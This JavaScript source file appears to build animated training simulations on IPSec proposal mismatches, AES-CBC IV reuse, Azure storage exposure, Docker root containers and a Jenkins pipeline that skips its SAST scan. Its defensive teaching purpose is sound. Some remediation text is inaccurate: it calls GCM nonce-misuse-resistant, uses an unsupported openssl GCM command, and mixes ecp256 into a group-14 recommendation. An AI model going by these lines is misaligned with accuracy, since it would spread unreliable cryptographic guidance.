        <div class="ipsec-phase" id="ipsec-phase-2">
          <div class="ipsec-phase-head">// Phase 2 — CREATE_CHILD_SA (IPsec SA)</div>
          <div class="ipsec-step" data-i="4"><span>5.</span> CREATE_CHILD_SA (SA, Ni, KEi, TSi, TSr)</div>
          <div class="ipsec-step" data-i="5"><span>6.</span> CREATE_CHILD_SA (SA, Nr, KEr, TSi, TSr)</div>
        </div>
      </div>
      <div class="ipsec-sa-compare" id="ipsec-sa-compare">
        <div class="ipsec-sa-col local">
          <div class="ipsec-sa-head">LOCAL proposal (Site A)</div>
          <div class="ipsec-sa-row ok"><span>enc</span><span>AES-256-GCM</span></div>
          <div class="ipsec-sa-row ok"><span>keylen</span><span>256</span></div>
          <div class="ipsec-sa-row ok"><span>hash</span><span>SHA-256</span></div>
          <div class="ipsec-sa-row ok"><span>group</span><span>14 (MODP-2048)</span></div>
          <div class="ipsec-sa-row ok"><span>prf</span><span>PRF_HMAC_SHA2_256</span></div>
        </div>
        <div class="ipsec-sa-col peer">
          <div class="ipsec-sa-head">PEER offer (Site B)</div>
          <div class="ipsec-sa-row bad"><span>enc</span><span>AES-128-CBC</span></div>
          <div class="ipsec-sa-row bad"><span>keylen</span><span>128</span></div>
          <div class="ipsec-sa-row bad"><span>hash</span><span>SHA-1</span></div>
          <div class="ipsec-sa-row bad"><span>group</span><span>2 (MODP-1024)</span></div>
          <div class="ipsec-sa-row bad"><span>prf</span><span>PRF_HMAC_SHA1</span></div>
        </div>
      </div>
      <div class="ipsec-verdict" id="ipsec-verdict">
        <strong>// verdict:</strong> SA proposal mismatch — recompute proposal, align on AES-256-GCM + SHA-256 + group 14.
      </div>
    </div>
  `;

  const lines = [
    `$ # IPSec — advanced investigation @ ${ts()}`,
    `$ # Verify an IPSec site-to-site tunnel`,
    `$ ipsec statusall`,
    'Rigid{SiteA-to-SiteB}[1]: ESTABLISHED 14 minutes ago, 203.0.113.10[4500]...198.51.100.20[4500]',
    'Rigid{SiteA-to-SiteB}[1]: IKEv2 SPIs: a1b2c3d4** e5f6g7h8**, rekey time 28540s',
    'Rigid{SiteA-to-SiteB}{1}: REKEYING, 5890s until rekey, 0 bytes out (0s ago)',
    `$ ipsec restart`,
    '00[LIB] IKEv2 proposal: AES-256-GCM-256 prf=SHA-256 ke=14',
    '00[LIB]   AES-256-GCM-256, keylen 256, IKEv2',
    '00[NET] sending IKE_SA_INIT request',
    '00[NET] received IKE_SA_INIT response from 198.51.100.20',
    '00[IKE] peer offers IKE proposal: AES-128-CBC prf=SHA-1 ke=2',
    '00[IKE] NO PROPOSAL CHOSEN — local AES-256-GCM vs peer AES-128-CBC',
    "00[IKE] authentication of '203.0.113.10' (self) failed",
    '00[KNL] destroying IKE_SA',
    '[err] Phase 2 CREATE_CHILD_SA failed — no IPsec SA installed',
    '$ # IOC: Phase 2 SA mismatch — local AES-256 vs peer AES-128',
    '$ # Recommended remediation:',
    '$ #   1. Align on AES-256-GCM + SHA-256 + MODP-2048 (group 14) on both peers',
    '$ #   2. Verify /etc/ipsec.conf esp=aes256gcm16-sha256; ike=aes256gcm16-prfsha256-ecp256',
    '$ #   3. Drop peer AES-128-CBC + SHA-1 + MODP-1024 (deprecated — RFC 8221 §3)',
    "$ #   4. Re-run ipsec statusall after reconfigure — look for 'IPsec SA INSTALLED'",
    '$ #   5. Enable PFS (Perfect Forward Secrecy) and IKEv2 rekey interval < 4h',
    '$ #   6. Verify NAT-T (UDP 4500) traversal — check no NAT between peers'
  ];

  function animate(host, timers) {
    const steps = host.querySelectorAll('#ipsec-panel .ipsec-step');
    const saRows = host.querySelectorAll('#ipsec-sa-compare .ipsec-sa-row');
    const tunnelState = host.querySelector('#ipsec-tunnel-state');
    const verdict = host.querySelector('#ipsec-verdict');

    // idempotent reset
    steps.forEach(s => s.classList.remove('on', 'done', 'fail'));
    saRows.forEach(r => r.classList.remove('on', 'mismatch'));
    if (tunnelState) { tunnelState.textContent = 'TUNNEL DOWN'; tunnelState.classList.remove('up'); }
    if (verdict) verdict.classList.remove('bad');

    // Phase 1 succeeds (4 steps PASS), Phase 2 fails (2 steps FAIL)
    steps.forEach((s, i) => {
      timers.later(() => { s.classList.add('on'); }, 300 + i * 700);
      timers.later(() => {
        s.classList.remove('on');
        if (i >= 4) s.classList.add('fail');          // Phase 2 fails
        else s.classList.add('done');                 // Phase 1 passes
        if (i === 5 && tunnelState) {
          tunnelState.textContent = 'TUNNEL DOWN (NO PROPOSAL)';
        }
      }, 300 + i * 700 + 600);
    });

    // Highlight SA mismatch and flip verdict red
    timers.later(() => {
      saRows.forEach(r => r.classList.add('on', 'mismatch'));
      if (tunnelState) { tunnelState.textContent = 'TUNNEL DOWN — SA MISMATCH'; tunnelState.classList.add('down'); }
      if (verdict) verdict.classList.add('bad');
    }, 300 + steps.length * 700 + 400);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

// ---------- 11) AES Encryption (Advanced) ----------
function buildAesSim(skill, meta, lvl) {
  const slug = 'aes-encryption';
  const id = (s) => `${slug}-${s}`;
  const p1 = 'The launch code is 7-3-5-1-9. Hold fire until authorized.';
  const p2 = 'The launch code is 7-3-5-9-2. Override requires chief signoff.';
  // Same key + same IV (CBC) → identical first ciphertext block (C0 = AES_K(IV ⊕ P0))
  const c1B0 = '8a2f9c1d4e5b6f0a7c8b9d1e2f3a4b5c';
  const c2B0 = '8a2f9c1d4e5b6f0a7c8b9d1e2f3a4b5c';  // identical to c1B0 — pattern leakage
  const c1B1 = 'f3a4b5c8d9e0f1a2b3c4d5e6f708091a';
  const c2B1 = 'a4b5c8d9e0f1a2b3c4d5e6f708091a91';

  const visual = `
    <div class="aes-panel" id="${id('panel')}">
      <div class="aes-cmd-line" id="${id('cmd-line')}">
        <span class="aes-prompt">$</span>
        <span class="aes-cmd-text" id="${id('cmd-text')}"></span>
      </div>
      <div class="aes-grid">
        <div class="aes-col">
          <div class="aes-col-head">// plaintext 1 (msg #1)</div>
          <pre class="aes-pt" id="${id('pt-1')}">${escapeHtmlS(p1)}</pre>
          <div class="aes-blocks" id="${id('c1')}">
            <div class="aes-block identical" id="${id('c1-b0')}">${c1B0}</div>
            <div class="aes-block" id="${id('c1-b1')}">${c1B1}</div>
          </div>
        </div>
        <div class="aes-col">
          <div class="aes-col-head">// plaintext 2 (msg #2)</div>
          <pre class="aes-pt" id="${id('pt-2')}">${escapeHtmlS(p2)}</pre>
          <div class="aes-blocks" id="${id('c2')}">
            <div class="aes-block identical" id="${id('c2-b0')}">${c2B0}</div>
            <div class="aes-block" id="${id('c2-b1')}">${c2B1}</div>
          </div>
        </div>
      </div>
      <div class="aes-key-info">
        <div><span>algo</span><code>aes-256-cbc</code></div>
        <div><span>key (K)</span><code>3f8c4a91d2e6b7f0a5c3d8e1f2a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4</code></div>
        <div class="alert"><span>IV</span><code>4f8a1c2d3b4e5f60718293a4b5c6d7e8</code> ← reused for both messages!</div>
      </div>
      <div class="aes-verdict" id="${id('verdict')}">
        <strong>// verdict:</strong> reused IV detected → identical first ciphertext block — pattern leakage. Use random IV per message + AES-GCM.
      </div>
    </div>
  `;

  const lines = [
    `$ # AES Encryption — advanced investigation @ ${ts()}`,
    `$ # Inspect AES key strength and mode`,
    `$ cat > secret.txt`,
    'The launch code is 7-3-5-1-9. Hold fire until authorized.',
    `$ cat > secret2.txt`,
    'The launch code is 7-3-5-9-2. Override requires chief signoff.',
    `$ openssl enc -aes-256-cbc -in secret.txt -out secret.enc -K 3f8c...3a4 -iv 4f8a...d7e8`,
    `$ openssl enc -aes-256-cbc -in secret2.txt -out secret2.enc -K 3f8c...3a4 -iv 4f8a...d7e8`,
    `$ xxd secret.enc | head -3`,
    '00000000: 8a2f 9c1d 4e5b 6f0a 7c8b 9d1e 2f3a 4b5c',
    '00000010: f3a4 b5c8 d9e0 f1a2 b3c4 d5e6 f708 091a',
    '00000020: 21fb 8a2f 9c1d 4e5b 6f0a 7c8b 9d1e 2f3a',
    `$ xxd secret2.enc | head -3`,
    '00000000: 8a2f 9c1d 4e5b 6f0a 7c8b 9d1e 2f3a 4b5c',
    '00000010: a4b5 c8d9 e0f1 a2b3 c4d5 e6f7 0809 1a91',
    '00000020: 8a3c 4d5e 6f70 8192 a3b4 c5d6 e7f8 091a',
    '[!] first ciphertext block of secret.enc == secret2.enc',
    '[!] CBC: C0 = AES_K(IV ⊕ P0) — same IV + same prefix → same C0',
    '[warn] IV reuse detected — pattern leakage across ciphertexts',
    '$ # IOC: AES-256-CBC with reused IV — pattern leakage',
    '$ # Recommended remediation:',
    '$ #   1. Use AES-GCM (authenticated encryption): openssl enc -aes-256-gcm -in ... -K ... -iv $RANDOM_IV',
    '$ #   2. NEVER reuse an IV with the same key — generate random 96-bit IV per message',
    '$ #   3. Replace CBC mode entirely — GCM/SIV/GCM-SIV are nonce-misuse-resistant',
    '$ #   4. Verify ciphertext with HMAC-SHA-256 tag (encrypt-then-MAC) if CBC unavoidable',
    '$ #   5. Rotate keys quarterly; never hard-code K in shell history (use HSM or KMS)',
    '$ #   6. Audit: flag any repeated IV via the saved ciphertexts (BLAKE2 of IV @ key)'
  ];

  function animate(host, timers) {
    const cmdText = host.querySelector(`#${id('cmd-text')}`);
    const cols = host.querySelectorAll(`#${id('panel')} .aes-col`);
    const c1B0 = host.querySelector(`#${id('c1-b0')}`);
    const c2B0 = host.querySelector(`#${id('c2-b0')}`);
    const verdict = host.querySelector(`#${id('verdict')}`);

    // idempotent reset
    cols.forEach(c => c.classList.remove('on'));
    if (verdict) verdict.classList.remove('bad');
    if (c1B0) c1B0.classList.remove('identical-now');
    if (c2B0) c2B0.classList.remove('identical-now');
    if (cmdText) cmdText.textContent = '';

    // typewriter the openssl command
    const cmd = 'openssl enc -aes-256-cbc -in secret.txt -out secret.enc -K <hexkey> -iv <hexiv>';
    let ci = 0;
    timers.every(() => {
      if (!cmdText) return;
      if (ci >= cmd.length) return;
      cmdText.textContent += cmd[ci++];
    }, 50);

    // reveal both columns' ciphertext blocks in sequence
    cols.forEach((c, i) => {
      timers.later(() => { c.classList.add('on'); }, 1200 + i * 600);
    });

    // highlight identical first blocks → pattern leakage verdict
    timers.later(() => {
      if (c1B0) c1B0.classList.add('identical-now');
      if (c2B0) c2B0.classList.add('identical-now');
      if (verdict) verdict.classList.add('bad');
    }, 1200 + cols.length * 600 + 400);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  BATCH E BUILDERS — registers one builder per Networking
 *  part-2 skill. Keys MUST match SKILL_META entries exactly.
 * ============================================================ */
const BATCH_E_BUILDERS = {
  'PPP':                     buildPppSim,
  'WiFi WPA2/WPA3/WiFi 6':   buildWifiSim,
  'DOCSIS':                  buildDocsisSim,
  'XGPON':                   buildXgponSim,
  'VoIP Security':           buildVoipSecuritySim,
  'Firewall':                buildFirewallSim,
  'ACL':                     buildAclSim,
  'NAT':                     buildNatSim,
  'QoS':                     buildQosSim,
  'IPSec':                   buildIpsecSim,
  'AES Encryption':          buildAesSim
};

/* ============================================================
 *  BATCH F — Cloud & DevSecOps (5 skills)
 *  Each builder produces a UNIQUE visual + animation + terminal.
 *  Skills covered (all bespoke, no shared template):
 *    1. Azure           (Beginner)     — Azure Portal "Create Web App" wizard
 *    2. Docker          (Intermediate) — docker-compose up -d + docker scan
 *    3. Jenkins         (Intermediate) — Pipeline #47 stage bar + Jenkinsfile viewer
 *    4. GitHub Actions  (Intermediate) — .github/workflows/ci.yml editor + zizmor lint
 *    5. TheHive         (Beginner)     — Case #1842 triage UI with observables + tasks
 *  Visuals are deliberately distinct: Portal mock / 3-column compose bench /
 *  horizontal stage bar / YAML editor + lint panel / case triage grid.
 * ============================================================ */

/* ---------- Azure (Beginner) — Portal wizard + security scan ---------- */
function buildAzureSim(skill, meta, lvl) {
  const slug = 'azure';
  const visual = `
    <div class="az-portal" id="az-portal">
      <div class="az-portal-head">
        <span class="az-portal-brand">☁️ Azure Portal</span>
        <span class="az-portal-search">🔍 Search resources, services, docs</span>
        <span class="az-portal-user">@jdoe.cloud · Sub: PayAsYouGo · West Europe</span>
      </div>
      <div class="az-portal-grid">
        <aside class="az-portal-side">
          <div class="sim-h">// Create a resource — wizard</div>
          <ul class="az-wizard" id="az-wizard">
            <li class="az-wizard-step pending" data-i="0">
              <span class="az-wizard-no">1</span>
              <span class="az-wizard-name"><b>Resource</b> → Web App</span>
              <span class="az-wizard-state">QUEUED</span>
            </li>
            <li class="az-wizard-step pending" data-i="1">
              <span class="az-wizard-no">2</span>
              <span class="az-wizard-name">Runtime: <b>Python 3.11</b> · Linux</span>
              <span class="az-wizard-state">QUEUED</span>
            </li>
            <li class="az-wizard-step pending" data-i="2">
              <span class="az-wizard-no">3</span>
              <span class="az-wizard-name">Plan: <b>F1 Free</b> (1 worker)</span>
              <span class="az-wizard-state">QUEUED</span>
            </li>
            <li class="az-wizard-step pending" data-i="3">
              <span class="az-wizard-no">4</span>
              <span class="az-wizard-name">Review + Create</span>
              <span class="az-wizard-state">QUEUED</span>
            </li>
            <li class="az-wizard-step pending" data-i="4">
              <span class="az-wizard-no">5</span>
              <span class="az-wizard-name">Deployment Center → <b>GitHub Actions</b></span>
              <span class="az-wizard-state">QUEUED</span>
            </li>
          </ul>
          <div class="az-tip" id="az-tip">// 💡 tooltip: each step maps to an az CLI command — see the panel on the right</div>
        </aside>
        <section class="az-portal-main">
          <div class="az-cmd" id="az-cmd"></div>
          <div class="az-scan" id="az-scan">
            <div class="az-scan-head">🔐 Defender for Cloud — Storage Scan</div>
            <div class="az-scan-body" id="az-scan-body">
              <p class="sim-p az-scan-empty">// scan pending — finish the wizard first…</p>
            </div>
          </div>
        </section>
      </div>
    </div>`;

  const lines = [
    `$ # Azure — guided walkthrough @ ${ts()}`,
    `$ # Goal: deploy a hardened Python web app, with documentation support`,
    `$ man az-webapp-create`,
    `[doc] SYNOPSIS — resource-group, plan, runtime, deployment-source`,
    `$ # Step 1: sign in & create a resource group`,
    `$ az login --use-device-code`,
    `[ok] signed in as jdoe@example.com · subscription PayAsYouGo`,
    `$ az group create --name rg-app-2025 --location westeurope`,
    `[ok] id /subscriptions/.../rg-app-2025 · provisioning Succeeded`,
    `$ # Step 2: create a Linux App Service plan (Free F1)`,
    `$ az appservice plan create --name plan-app --sku F1 --is-linux -g rg-app-2025`,
    `[ok] plan created · 1 free worker · linux`,
    `$ # Step 3: create the web app — Python 3.11 runtime`,
    `$ az webapp create --name app-sm-2025 -g rg-app-2025 --plan plan-app --runtime "PYTHON:3.11"`,
    `[ok] app created · https://app-sm-2025.azurewebsites.net`,
    `$ # Step 4: configure CI/CD from GitHub`,
    `$ az webapp deployment source config --name app-sm-2025 -g rg-app-2025 --repo-url https://github.com/jdoe/app --branch main`,
    `[ok] GitHub Actions CI/CD configured · workflow .github/workflows/main_app-sm-2025.yml`,
    `$ # Step 5: security review — list storage container visibility`,
    `$ az storage container list --account-name stappsm2025 --query "[].{name:name,access:properties.publicAccess}"`,
    `[warn] container "backups" publicAccess: Blob`,
    `[warn] container "secrets" publicAccess: Blob — CRITICAL`,
    `$ az storage container set-permission --name secrets --account-name stappsm2025 --public-access off`,
    `[ok] access restricted — finding resolved`,
    `$ # → ready to progress to intermediate workflows`
  ];

  function animate(host, timers) {
    const wizard = host.querySelector('#az-wizard');
    if (!wizard) return;
    const steps = wizard.querySelectorAll('.az-wizard-step');
    const cmdHost = host.querySelector('#az-cmd');
    const scanBody = host.querySelector('#az-scan-body');
    const tip = host.querySelector('#az-tip');

    // idempotent reset
    steps.forEach((s) => {
      s.className = 'az-wizard-step pending';
      const st = s.querySelector('.az-wizard-state');
      if (st) st.textContent = 'QUEUED';
    });
    if (cmdHost) cmdHost.innerHTML = '';
    if (scanBody) scanBody.innerHTML = '<p class="sim-p az-scan-empty">// scan pending — finish the wizard first…</p>';
    if (tip) tip.textContent = '// 💡 tooltip: each step maps to an az CLI command — see the panel on the right';

    const stepCmds = [
      'az group create --name rg-app-2025 --location westeurope',
      'az webapp create --name app-sm-2025 -g rg-app-2025 --plan plan-app --runtime "PYTHON:3.11"',
      'az appservice plan create --name plan-app --sku F1 --is-linux -g rg-app-2025',
      'az webapp deployment source config --name app-sm-2025 -g rg-app-2025 --repo-url github.com/jdoe/app --branch main',
      'az storage container list --account-name stappsm2025 --query "[].{name,access}"'
    ];
    const stepOuts = [
      '[ok] resource group rg-app-2025 created (westeurope)',
      '[ok] app-sm-2025 → https://app-sm-2025.azurewebsites.net',
      '[ok] plan plan-app · F1 free · linux',
      '[ok] GitHub Actions CI/CD wired (workflow main_app-sm-2025.yml)',
      '[ok] 3 containers found in stappsm2025'
    ];
    const tipTexts = [
      'az group create — creates a logical container for resources',
      'az webapp create --runtime PYTHON:3.11 — Linux runtime stack',
      'az appservice plan --sku F1 — Free tier, 1 worker',
      'az webapp deployment source config — GitHub Actions CI/CD',
      'az storage container list — audit public visibility'
    ];

    steps.forEach((s, i) => {
      const tStart = 600 + i * 1400;
      const tEnd = tStart + 1050;
      timers.later(() => {
        s.classList.remove('pending'); s.classList.add('running');
        const st = s.querySelector('.az-wizard-state');
        if (st) st.textContent = 'RUNNING';
        if (tip) tip.textContent = '// 💡 doc: ' + tipTexts[i];
        // stream cmd + output into the right-hand panel
        if (cmdHost) {
          const cmdLine = el('div', 'term-line');
          cmdLine.innerHTML = '<span class="term-prompt">$</span><span class="term-out"> ' + escapeHtmlS(stepCmds[i]) + '</span>';
          cmdHost.appendChild(cmdLine);
          timers.later(() => {
            const outLine = el('div', 'term-line');
            outLine.innerHTML = '<span class="term-ok">' + escapeHtmlS(stepOuts[i]) + '</span>';
            cmdHost.appendChild(outLine);
            cmdHost.scrollTop = cmdHost.scrollHeight;
          }, 600);
        }
      }, tStart);
      timers.later(() => {
        s.classList.remove('running'); s.classList.add('done');
        const st = s.querySelector('.az-wizard-state');
        if (st) st.textContent = 'DONE';
      }, tEnd);
    });

    // After all wizard steps: trigger the storage security scan
    const scanStart = 600 + steps.length * 1400 + 400;
    timers.later(() => {
      if (!scanBody) return;
      scanBody.innerHTML = '';
      const head = el('div', 'sim-h');
      head.textContent = '// scanning containers in stappsm2025…';
      scanBody.appendChild(head);
      const findings = [
        { c: 'ok',   t: '✓ container "uploads"  — private (Blob access off)' },
        { c: 'warn', t: '! container "backups"  — publicAccess Blob (exposes archive)' },
        { c: 'crit', t: '✗ container "secrets" — publicAccess Blob (exposes .env + tokens)' }
      ];
      findings.forEach((f, i) => {
        timers.later(() => {
          const row = el('div', 'az-scan-row ' + f.c);
          row.textContent = f.t;
          scanBody.appendChild(row);
        }, 400 + i * 1000);
      });
      timers.later(() => {
        const fix = el('div', 'az-scan-fix');
        fix.innerHTML = '<b>Remediation:</b> <code>az storage container set-permission --name secrets --public-access off</code> · repeat for backups';
        scanBody.appendChild(fix);
      }, 400 + findings.length * 1000 + 200);
    }, scanStart);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- Docker (Intermediate) — docker-compose bench ---------- */
function buildDockerSim(skill, meta, lvl) {
  const slug = 'docker';
  const visual = `
    <div class="docker-bench">
      <div class="docker-topo">
        <div class="sim-h">// docker-compose topology</div>
        <div class="docker-net" id="docker-net">app_appnet · bridge · 172.20.0.0/16</div>
        <div class="docker-ctns" id="docker-ctns">
          <div class="docker-ctn pending" data-i="0">
            <span class="dc-ico">🌐</span>
            <span class="dc-name">nginx:1.25</span>
            <span class="dc-port">→ 8080:80</span>
            <span class="dc-state">IDLE</span>
          </div>
          <div class="docker-ctn pending" data-i="1">
            <span class="dc-ico">🐘</span>
            <span class="dc-name">postgres:16</span>
            <span class="dc-port">→ 5432</span>
            <span class="dc-state">IDLE</span>
          </div>
          <div class="docker-ctn pending" data-i="2">
            <span class="dc-ico">🐍</span>
            <span class="dc-name">app:latest</span>
            <span class="dc-port">→ 8000</span>
            <span class="dc-state">IDLE</span>
          </div>
        </div>
        <div class="docker-vols">
          <div class="docker-vol" id="docker-vol-0">📁 vol_db → /var/lib/postgresql/data</div>
          <div class="docker-vol" id="docker-vol-1">📁 vol_static → /app/static</div>
        </div>
      </div>
      <div class="docker-term-wrap">
        <div class="sim-h">// docker-compose up -d</div>
        <div class="term" id="docker-term" style="min-height:200px"></div>
      </div>
      <div class="docker-scan-wrap">
        <div class="sim-h">// docker scan app:latest</div>
        <div class="docker-scan" id="docker-scan"></div>
      </div>
    </div>`;

  const lines = [
    `$ # Docker — daily workflow @ ${ts()}`,
    `$ # typical daily workflow — independent troubleshooting`,
    `$ docker-compose up -d`,
    `[+] Running 4/4`,
    ` ⠿ Network app_appnet       Created  bridge 172.20.0.0/16`,
    ` ⠿ Container app-nginx-1    Started  0.4s   8080:80`,
    ` ⠿ Container app-postgres-1 Started  0.5s   5432 (vol_db)`,
    ` ⠿ Container app-app-1      Started  0.7s   8000 (vol_static)`,
    `[ok] all 3 containers healthy · 2 volumes mounted`,
    `$ docker scan app:latest`,
    `[warn] Container runs as root — error: no USER directive in Dockerfile`,
    `[warn] least-privilege principle violated — remediate before prod`,
    `$ grep USER Dockerfile || echo "no USER directive found"`,
    `[warn] no USER directive found`,
    `$ # Recommendation:`,
    `$ #   add USER 1001 after COPY/install steps`,
    `$ #   run with --read-only --cap-drop ALL --security-opt no-new-privileges`,
    `$ docker scan --file Dockerfile .`,
    `[ok] base image python:3.11-slim — 0 critical CVEs`,
    `[warn] add USER 1001 and --read-only runtime flag`,
    `$ # Workflow complete — 1 finding, gated for prod`
  ];

  function animate(host, timers) {
    const ctns = host.querySelectorAll('#docker-ctns .docker-ctn');
    const net = host.querySelector('#docker-net');
    const vols = [host.querySelector('#docker-vol-0'), host.querySelector('#docker-vol-1')];
    const term = host.querySelector('#docker-term');
    const scan = host.querySelector('#docker-scan');

    // idempotent reset
    ctns.forEach((c) => {
      c.className = 'docker-ctn pending';
      const st = c.querySelector('.dc-state');
      if (st) st.textContent = 'IDLE';
    });
    if (net) net.className = 'docker-net';
    vols.forEach((v) => { if (v) v.className = 'docker-vol'; });
    if (term) term.innerHTML = '';
    if (scan) scan.innerHTML = '';

    const upLines = [
      { c: 'out', t: '[+] Running 4/4' },
      { c: 'ok',  t: ' ⠿ Network app_appnet       Created  bridge 172.20.0.0/16' },
      { c: 'ok',  t: ' ⠿ Container app-nginx-1    Started  0.4s   8080:80' },
      { c: 'ok',  t: ' ⠿ Container app-postgres-1 Started  0.5s   5432 (vol_db)' },
      { c: 'ok',  t: ' ⠿ Container app-app-1      Started  0.7s   8000 (vol_static)' },
      { c: 'ok',  t: '[ok] all 3 containers healthy · 2 volumes mounted' }
    ];

    // sequential compose-up output + container state changes
    upLines.forEach((l, i) => {
      timers.later(() => {
        if (term) {
          const ln = el('div', 'term-line');
          ln.innerHTML = '<span class="term-' + l.c + '">' + escapeHtmlS(l.t) + '</span>';
          term.appendChild(ln);
          term.scrollTop = term.scrollHeight;
        }
        // map line index → container index: lines[2,3,4] → ctns[0,1,2]
        if (i >= 2 && i <= 4) {
          const idx = i - 2;
          const c = ctns[idx];
          if (c) {
            c.classList.remove('pending'); c.classList.add('running');
            const st = c.querySelector('.dc-state');
            if (st) st.textContent = 'STARTING';
            timers.later(() => {
              c.classList.remove('running'); c.classList.add('done');
              if (st) st.textContent = 'HEALTHY';
              if (idx < vols.length && vols[idx]) vols[idx].classList.add('mounted');
            }, 500);
          }
        }
        if (i === 1 && net) net.classList.add('active');
      }, 600 + i * 850);
    });

    // After up output, run docker scan with the root-user finding
    const scanStart = 600 + upLines.length * 850 + 300;
    const scanLines = [
      { c: 'out',  t: '$ docker scan app:latest' },
      { c: 'ok',   t: '✓ image has 0 critical CVEs' },
      { c: 'err',  t: '✗ Container runs as root — no USER directive in Dockerfile' },
      { c: 'err',  t: '✗ Capabilities: NET_ADMIN, SYS_ADMIN present (drop ALL)' },
      { c: 'warn', t: '! Recommendation: add `USER 1001` after COPY/install steps' },
      { c: 'warn', t: '! Run with: --read-only --cap-drop ALL --security-opt no-new-privileges' }
    ];
    scanLines.forEach((s, i) => {
      timers.later(() => {
        if (!scan) return;
        const r = el('div', 'docker-scan-row ' + s.c);
        r.textContent = s.t;
        scan.appendChild(r);
      }, scanStart + i * 950);
    });
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- Jenkins (Intermediate) — Pipeline #47 + Jenkinsfile ---------- */
function buildJenkinsSim(skill, meta, lvl) {
  const slug = 'jenkins';
  const visual = `
    <div class="jenkins-view">
      <div class="jenkins-head">
        <span class="jenkins-logo">🔧 Jenkins</span>
        <span class="jenkins-build">Pipeline <b>#47</b> · branch main · commit 4f8c2e1</span>
        <span class="jenkins-state running" id="jenkins-state">RUNNING</span>
      </div>
      <div class="jenkins-stage-bar" id="jenkins-stages">
        <div class="jenkins-stage pending" data-i="0">
          <span class="js-no">01</span>
          <span class="js-name">Checkout</span>
          <span class="js-time">—</span>
          <span class="js-state">QUEUED</span>
        </div>
        <div class="jenkins-stage pending" data-i="1">
          <span class="js-no">02</span>
          <span class="js-name">Build</span>
          <span class="js-time">—</span>
          <span class="js-state">QUEUED</span>
        </div>
        <div class="jenkins-stage pending" data-i="2">
          <span class="js-no">03</span>
          <span class="js-name">Test</span>
          <span class="js-time">—</span>
          <span class="js-state">QUEUED</span>
        </div>
        <div class="jenkins-stage pending" data-i="3">
          <span class="js-no">04</span>
          <span class="js-name">SAST</span>
          <span class="js-time">—</span>
          <span class="js-state">QUEUED</span>
        </div>
        <div class="jenkins-stage pending" data-i="4">
          <span class="js-no">05</span>
          <span class="js-name">Deploy</span>
          <span class="js-time">—</span>
          <span class="js-state">QUEUED</span>
        </div>
      </div>
      <div class="jenkins-file-grid">
        <div class="script-editor">
          <div class="sim-h">// Jenkinsfile (declarative)</div>
          <pre class="code-viewer" id="jenkins-file" style="max-height:240px"></pre>
        </div>
        <div class="jenkins-findings">
          <div class="sim-h">// Security gate audit</div>
          <ul class="jenkins-findings-list" id="jenkins-findings-list"></ul>
        </div>
      </div>
    </div>`;

  const lines = [
    `$ # Jenkins — daily workflow @ ${ts()}`,
    `$ # typical daily workflow — independent troubleshooting`,
    `$ java -jar jenkins-cli.jar -s http://localhost:8080 build app-pipeline -f -v`,
    `[ok] Started Build #47 · branch main · commit 4f8c2e1`,
    `[ok]  stage  Checkout   2.4s  ✓  git fetch + checkout main`,
    `[ok]  stage  Build      7.1s  ✓  mvn package → target/app.jar`,
    `[ok]  stage  Test       4.2s  ✓  42 tests, 0 failures`,
    `[warn] stage  SAST      0.1s  ⊘ SKIPPED (--exclude legacy/)`,
    `[ok]  stage  Deploy     3.3s  ✓  kubectl apply → 3 replicas ready`,
    `[warn] security gate bypassed — SAST skipped via --exclude legacy/`,
    `$ grep -A4 "stage('SAST')" Jenkinsfile`,
    `   stage('SAST') {`,
    `     steps {`,
    `       sh 'sast-scan --exclude legacy/'`,
    `     }`,
    `   }`,
    `[warn] 14 findings hidden in legacy/ (5 HIGH, 9 MEDIUM)`,
    `[ok] workflow complete — FIX: remove --exclude; gate the deploy stage`
  ];

  const jenkinsfileLines = [
    'pipeline {',
    "  agent { label 'linux' }",
    '  options { timestamps() }',
    '  stages {',
    "    stage('Checkout') {",
    '      steps { checkout scm }',
    '    }',
    "    stage('Build') {",
    "      steps { sh 'mvn -B -DskipTests package' }",
    '    }',
    "    stage('Test') {",
    "      steps { sh 'mvn test' }",
    '    }',
    "    stage('SAST') {",
    "      steps { sh 'sast-scan --exclude legacy/' }",
    '    }',
    "    stage('Deploy') {",
    "      steps { sh 'kubectl apply -f k8s/prod.yaml' }",
    '    }',
    '  }',
    '}'
  ];

  function animate(host, timers) {
    const stages = host.querySelectorAll('#jenkins-stages .jenkins-stage');
    const state = host.querySelector('#jenkins-state');
    const fileHost = host.querySelector('#jenkins-file');
    const findings = host.querySelector('#jenkins-findings-list');

    // idempotent reset
    stages.forEach((s) => {
      s.className = 'jenkins-stage pending';
      const t = s.querySelector('.js-time'); if (t) t.textContent = '—';
      const st = s.querySelector('.js-state'); if (st) st.textContent = 'QUEUED';
    });
    if (state) { state.className = 'jenkins-state running'; state.textContent = 'RUNNING'; }
    if (fileHost) fileHost.innerHTML = '';
    if (findings) findings.innerHTML = '';

    // 5 stages — SAST (#3) ends as SKIPPED/red
    const stageMeta = [
      { dur: 1100, time: '2.4s', fail: false, st: 'PASS' },
      { dur: 1300, time: '7.1s', fail: false, st: 'PASS' },
      { dur: 1000, time: '4.2s', fail: false, st: 'PASS' },
      { dur: 700,  time: '0.1s', fail: true,  st: 'SKIP' },
      { dur: 1100, time: '3.3s', fail: false, st: 'PASS' }
    ];
    let t = 500;
    stageMeta.forEach((m, i) => {
      timers.later(() => {
        stages[i].classList.remove('pending');
        stages[i].classList.add('running');
        const st = stages[i].querySelector('.js-state');
        if (st) st.textContent = 'RUNNING';
      }, t);
      t += m.dur;
      timers.later(() => {
        stages[i].classList.remove('running');
        stages[i].classList.add(m.fail ? 'fail' : 'done');
        const tm = stages[i].querySelector('.js-time'); if (tm) tm.textContent = m.time;
        const st = stages[i].querySelector('.js-state'); if (st) st.textContent = m.st;
      }, t);
      t += 200;
    });

    // Final overall state: PASS w/ WARN
    timers.later(() => {
      if (state) { state.className = 'jenkins-state warn'; state.textContent = 'PASS w/ WARN'; }
    }, t + 200);

    // Type out the Jenkinsfile line by line (SAST lines get the .jf-flag accent)
    jenkinsfileLines.forEach((line, i) => {
      timers.later(() => {
        if (!fileHost) return;
        const isFlag = line.indexOf('SAST') !== -1 || line.indexOf('--exclude') !== -1;
        const ln = el('div', 'jf-line' + (isFlag ? ' jf-flag' : ''));
        ln.textContent = line;
        fileHost.appendChild(ln);
